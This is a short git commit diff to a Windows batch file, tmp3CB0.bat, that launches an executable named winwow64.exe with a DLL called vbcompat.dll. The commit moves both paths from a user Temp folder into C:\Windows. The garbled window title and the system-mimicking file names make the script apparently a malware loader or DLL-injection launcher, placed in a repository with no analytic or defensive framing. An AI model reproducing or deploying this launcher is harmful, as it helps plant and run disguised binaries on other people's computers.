6a7e9df6d9d30cdb9436a437bced248094d19633
MizuiroDzn <96056137+MizuiroDzn@users.noreply.github.com>
2024-07-31 20:53:33 +0900

    Update tmp3CB0.bat

--- tmp3CB0.bat
+++ tmp3CB0.bat
@@ -1,6 +1,6 @@
 @echo off
 title %dsa932#(230#)*$
-set DLL_PATH="C:\Users\Administrator\AppData\Local\Temp\vbcompat.dll"
-set EXE_PATH="C:\Users\Administrator\AppData\Local\Temp\winwow64.exe"
+set DLL_PATH="C:\Windows\vbcompat.dll"
+set EXE_PATH="C:\Windows\winwow64.exe"
 
 start "" %EXE_PATH% %DLL_PATH%
